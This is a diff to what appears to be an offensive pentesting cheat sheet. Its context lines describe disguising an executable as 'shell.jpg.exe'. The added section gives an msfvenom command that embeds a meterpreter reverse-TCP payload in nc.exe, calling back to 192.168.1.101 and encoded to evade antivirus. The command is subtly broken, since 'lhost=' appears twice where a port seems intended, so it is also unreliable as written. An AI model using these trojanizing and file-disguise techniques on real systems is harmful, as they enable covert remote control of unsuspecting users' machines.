@@ -26,6 +26,13 @@ Of course the user will have to accept to download the file, unless the user has
 
 Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as "shell.jpg".
 
+### Embed malicious code in legitimate file
+
+It is however very likely that this will be picked up by a antivirus.
+
+```
+msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe
+```
 
 ## ActiveX
 
